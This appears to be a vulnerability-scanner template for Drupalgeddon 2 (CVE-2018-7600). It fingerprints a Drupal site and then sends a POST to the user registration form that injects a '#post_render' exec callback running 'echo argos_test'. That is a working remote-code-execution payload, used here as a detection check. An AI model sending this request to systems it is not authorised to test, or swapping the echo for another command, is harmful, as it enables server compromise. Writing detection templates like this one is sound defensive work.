id: CVE-2018-7600
name: "Drupal Drupalgeddon 2 RCE"
severity: critical
description: "Drupal before 7.58 and 8.x before 8.5.1 allows remote code execution via crafted requests to the Form API."
reference: CWE-20
confidence: tentative
requests:
  - method: GET
    path: "/"
    matchers:
      - type: body
        words:
          - "Drupal"
          - "drupal"
      - type: status
        status: [200]
    condition: and
  - method: POST
    path: "/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
    headers:
      Content-Type: "application/x-www-form-urlencoded"
    body: "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=echo argos_test"
    matchers:
      - type: body
        words:
          - "command"
          - "settings"
      - type: status
        status: [200]
    condition: and
